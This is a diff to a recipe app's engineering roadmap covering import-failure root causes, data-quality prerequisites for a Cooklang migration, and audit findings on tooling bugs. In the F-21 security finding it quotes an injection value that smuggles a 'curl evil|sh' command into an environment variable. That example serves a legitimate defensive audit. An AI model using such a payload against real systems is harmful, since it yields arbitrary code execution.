@@ -613,9 +613,16 @@ than quietly overwritten; the text above is preserved as it stood.
 **Plans:** 6 plans in 3 waves
 **Planned:** 2026-07-28. Root cause established empirically against the LIVE stack by three independent
 agents; recorded as locked decisions in `27.1-CONTEXT.md`. No RESEARCH.md — the evidence is the research.
-**The defect, in one line:** import failures are INTERMITTENT, from three sub-causes — a strict
+~~**The defect, in one line:** import failures are INTERMITTENT, from three sub-causes — a strict
 validator that discards complete metric-only recipes, reasoning-token exhaustion on large HTML, and no
-retry — compounded by two UX defects that make a failure look like nothing happened.
+retry — compounded by two UX defects that make a failure look like nothing happened.~~
+**⚠ SUPERSEDED 2026-07-28 by the CORRECTION block seven lines above** (it is the same correction; this
+line survived unmarked and reads as current). Struck through, not deleted, to preserve the record.
+**The defect, in one line, CORRECTED:** import failures are DETERMINISTIC PER PAGE SHAPE — the upstream
+sanitizer `extractSanitizedBody` (`packages/shared-server/src/ai/helpers.ts:93`) starves the model of
+the recipe text on `<br>`-separated Blogger pages, so the model correctly returns `{}`. That is 24 of
+the 25 live AI failures; the 25th is reasoning-token exhaustion, which this phase's retry did fix.
+Owned by **Phase 27.2** / `IMPORT-SANITIZE-01`.
 **Success Criteria:**
   1. A complete single-system extraction imports (the absent measurement half is mirrored, never a rejection).
   2. A transient AI failure gets exactly one retry, at raised output-token headroom; a deterministic one gets none.
@@ -761,6 +768,54 @@ Items with no owning phase need a decision.
   - **F-18 (NEW, SECURITY CHORE — owned by Phase 27.4). The DeepSeek API key must be rotated.** It
     was exposed in a session transcript earlier and was briefly written to `/tmp` on 2026-07-28.
     Confirmed NOT in the git tree.
+  - **F-19 (NEW, DATA QUALITY, LIVE — a HARD PREREQUISITE OF PHASE 27.6). The live Cooklang derives
+    are worthless and nothing owned that fact.** Until now this was narrated only as prose in
+    `STATE.md:201-214` with no owner and no phase. Two coupled defects: (a) the live recipe's
+    `cook_confidence` is **0.000** — all 10 ingredient tokens are clumped as `@ingredient{qty%unit}`
+    at the END of step 1 instead of placed inline in the steps that use them, and every later step
+    carries no markup at all; (b) the live `steps` table carries **pre-existing duplicate bilingual
+    rows** (Gnocchi: 10 rows = 5 Dutch + 5 English; Bonensalade: 12 rows for ~6 canonical steps plus
+    a stray order-0 row). (b) is the root cause of (a) and therefore of W5's **5-of-6 low-confidence
+    derives** — where the source data carries no per-step ingredient association, the seeder falls
+    back to attaching everything to step 1, which is exactly what the confidence score measures and
+    flags. Step count was 80 both before and after `0042`, so the backfill introduced none of it:
+    this is live data quality, not a migration defect, and it predates Phase 27. The confidence flags
+    are doing real work — `cook_review_needed` is set on all 5 — but nobody has repaired the rows.
+    **Why this is a PREREQUISITE and not a nice-to-have:** Phase 27.6 makes `cook_source` NOT NULL.
+    Imposing an irreversible single-source-of-truth contract over derives at 0.000 confidence
+    **locks the bad derives in permanently** — there is no longer a legacy projection to fall back
+    to, and the migration is forward-only. Deduplicate the bilingual `steps` rows and re-derive (or
+    human-review through W5's repair tool) BEFORE `0043` is written. Listed as prerequisite 5 in the
+    Phase 27.6 entry below; needs its own plan, not a footnote.
+  - **F-20 (NEW, TOOLING — blocks Phase 27.2's acceptance gate). The `tooling/import-gate/` harness
+    has three real bugs, and Phase 27.2's gate runs it.** Documented as finding **WR-10** in
+    `27.1-REVIEW-C-apps-tooling.md` (`run-import-gate.mjs:196-222, 300, 320-323`). The harness works
+    — `--self-test` passes and the redaction path is sound — but: (1) **infinite loop on a
+    non-numeric env var.** `:320` `Number(process.env.GATE_POLL_TIMEOUT_MS ?? 180000)` yields `NaN`
+    for any non-numeric value, and in `pollRecipe` (`:216`) `Date.now() >= NaN` is **always false**,
+    so the `for(;;)` never terminates while the server keeps returning 404. Same class for
+    `GATE_POLL_INTERVAL_MS` (`NaN` → `setTimeout(…, NaN)` → 0 ms → a tight fetch loop hammering the
+    live server). Fix with a finite-and-positive coercion helper. (2) **Unguarded `readFileSync`
+    inside the URL loop** (`:300`): a missing or rotated `GATE_LOG_FILE` throws out of
+    `runUrl`/`main`, so **no** `GATE_OUT_JSON`/`GATE_OUT_MD` is written and every already-completed
+    row is lost. (3) **`GATE_MIN_URLS` defaults to `0`** (`:323`) — combined with a low
+    `GATE_MIN_CATEGORIES`, a gate that passes on an empty run. **Fix these before running Phase
+    27.2's gate**, or the gate hangs on defect 1 and silently discards its evidence on defect 2.
+  - **F-21 (NEW, SECURITY — owned by Phase 27.4, under OPS-01). Command injection and swallowed exit
+    codes in the cross-AI executor.** Finding **WR-11** in `27.1-REVIEW-C-apps-tooling.md`;
+    `tooling/cross-ai/antigravity-executor.sh:46,48`. `$MODEL` (`NORISH_GEMINI_MODEL`), `$AGY`
+    (`NORISH_AGY_BIN`) and `$SANDBOX` (`NORISH_AGY_SANDBOX`) are interpolated **unquoted and
+    unescaped** into a string handed to `script -c`, which executes it via `sh -c` — so
+    `NORISH_GEMINI_MODEL='x"; curl evil|sh; #'` is arbitrary code execution. The prompt itself is
+    correctly base64-armoured; the config vars are not. The threat model is limited (the operator
+    sets these) but this runs **unattended from cron**. Compounding it, `|| true` on `:48`
+    **discards the executor's exit status entirely**, breaking `worker.sh`'s documented contract
+    (`:7-8`: "exit code is the executor's — 0 = done, 75 = quota, other = failure") that
+    `run-or-defer.sh:61-86` routes on: a hard `agy` failure that still printed something is filed as
+    `done/` with a bogus SUMMARY. That directly undermines CLAUDE.md's "never trust the worker's
+    self-reported Self-Check" — there is not even a reliable failure signal to distrust. Fix: build
+    an argv array instead of a shell string, and capture `rc` rather than `|| true`. **It was on no
+    phase's list until now.**
 
 ## Sequencing rationale (Phases 27.2–27.6, inserted 2026-07-28)
 
@@ -826,7 +881,13 @@ the user-visible "AI response did not match expected format."
   3. **Observability — the reason this cost a week instead of an hour.** Log the sanitized content
      length at `info` alongside "Starting AI recipe extraction", and **warn loudly when a large page
      yields a tiny sanitized body**: that is a *parser-bug* signature, not a "no recipe here"
-     signature, and nothing in the logs distinguished the two.
+     signature, and nothing in the logs distinguished the two. **This is not a level bump — it is a
+     new `info` line.** An `extractionContentLength` debug line ALREADY EXISTS at
+     `packages/api/src/ai/recipe-parser.ts:105` and it **never fired once** during the entire
+     investigation, because live runs above `debug`. Raising that line's level is the minimum; the
+     requirement (IMPORT-OBS-01) is that the length is observable **at the live log level**, so it
+     must land at `info`, and the large-page/tiny-body case must be a `warn`. Verify against the
+     deployed container's actual log output, not against the source.
   4. **Fix the lying log marker** at `packages/api/src/parser/index.ts:353`. It fires from the call
      site at `:454` even when AI was never invoked, because the guard at `:432` is
      `aiEnabled && await isPageLikelyRecipe(html)` — so a page that never reached the model still
@@ -838,10 +899,21 @@ the user-visible "AI response did not match expected format."
      packages this phase edits. The other four are 27.3's job.
 
 **ACCEPTANCE GATE (hard):**
-  - The gate **MUST exercise the AI path on non-JSON-LD pages**. The blogspot set, all five:
-    susannekookt/kwarkbol, kokenzonderkennis/soto-soep, doorboerstra/soto-ajam,
-    kokenmetaly/shoarma-soep, taartenzoet/boterkoek.
+  - The gate **MUST exercise the AI path on non-JSON-LD pages**. The URL set is recorded in full, with
+    schemes verbatim as submitted live, at **`tooling/import-gate/urls.blogspot.txt`** — five
+    expected-FAIL-pre-fix pages (susannekookt/kwarkbol, kokenzonderkennis/soto-soep,
+    doorboerstra/soto-ajam, kokenmetaly/shoarma-soep, taartenzoet/boterkoek) plus two **CONTROLS**
+    that already passed pre-fix and must stay green (wiswijzer/erwtensoep and
+    keukenprinsessen/koolraap — the only two of the seven whose post-body contains `<li>`, which is
+    the 7/7 correlation that established the root cause; a sanitizer change that breaks a page it
+    used to handle is a regression, and these are the regression detectors). Recovered from the live
+    2026-07-28 diagnostic logs on 2026-07-29; do not re-derive them from prose.
   - Record **`parserPath` and `usedAI` per URL** in the evidence.
+  - **FIX F-20 FIRST.** This gate runs `tooling/import-gate/run-import-gate.mjs`, and that harness
+    carries three bugs (F-20 / WR-10) — most importantly an **infinite poll loop** when
+    `GATE_POLL_TIMEOUT_MS` is non-numeric (`NaN` deadline → `Date.now() >= NaN` is always false), and
+    an unguarded `readFileSync` that discards the whole run's evidence on one bad log read. Running
+    the gate before fixing them risks a hang and a silently lost run.
   - **A gate that only passes JSON-LD pages is EXPLICITLY INSUFFICIENT and does not close this
     phase.** 27.1's 24/24 gate was exactly that gate: every import logged `parserPath:"structured"`,
     `usedAI:false`, certifying a path 27.1 never modified. Extend `tooling/import-gate/`
@@ -905,7 +977,7 @@ isolation items adversarially proven.
 **Status**: NOT STARTED. Plan via `gsd:plan-phase` when it starts.
 **Depends on**: Phase 27.3 (honest gates — several of these are exactly the class `--noCheck` hides).
 **Requirements**: COOKPOOL-01, PENDING-ISO-02, ACCT-DEL-01, SW-CACHE-01, OPS-01
-(closes F-5, F-11, F-12, F-13, F-14, F-15, F-18)
+(closes F-5, F-11, F-12, F-13, F-14, F-15, F-18, **F-21**)
 
 **Scope, in descending user impact:**
   1. **COOKPOOL-01 — the parse pool's child resolution, across BOTH bundlers** (F-11 above has the
@@ -995,7 +1067,8 @@ fork, `unit-converter.ts`, the heuristic ingredient-link markup and the timer-ke
 **Status**: NOT STARTED — and NOT plannable until its prerequisites are discharged. Plan via
 `gsd:plan-phase` when they are.
 **Depends on**: Phases 27.2, 27.3, 27.4 (hard — see prerequisites), 27.5 (soft — deleting dead code
-first keeps this diff readable).
+first keeps this diff readable), **and F-19 (hard — a data-quality prerequisite owned by no other
+phase; see prerequisite 5)**.
 **Requirements**: COOK-02 (completes COOK-01)
 
 **Kiran, 2026-07-28 (binding):** *"Ik wil cooklang als de enige source of truth hebben. de rest mag
@@ -1028,6 +1101,18 @@ whether, only of order.
      translate, not clear.
   4. **The 8 000 ms wall backstop** (27-04's `cookParseCpuMs: 1_500` CPU gate plus the wall
      backstop) still holds on the mint path once every write path runs it.
+  5. **F-19 IS DISCHARGED — the live derives are actually good, not merely present.** This is a HARD
+     prerequisite, on the same footing as 1–4, and it is about QUALITY where the others are about
+     coverage. The live recipe's `cook_confidence` is **0.000**: all 10 ingredient tokens are clumped
+     as `@ingredient{qty%unit}` at the end of step 1 rather than placed inline, and later steps carry
+     no markup at all. The cause is **pre-existing duplicate bilingual `steps` rows** on live
+     (Gnocchi 10 rows = 5 NL + 5 EN; Bonensalade 12 rows for ~6 canonical steps plus a stray order-0
+     row) — which is also why W5 derived cleanly for only 1 of 6 recipes and flagged the other 5.
+     `cook_source NOT NULL` is an **irreversible, forward-only contract**, and it removes the legacy
+     projection that is currently masking these derives. Imposing it over 0.000-confidence data
+     **locks the bad derives in permanently**. Deduplicate the `steps` rows and re-derive (or
+     human-review through W5's repair tool) **before** `0043` is written. See F-19 in the follow-ups
+     register.
 
 **Only then, in this order:**
   5. Migration **`0043` — `cook_source` NOT NULL.** Irreversible; requires a verified-restorable
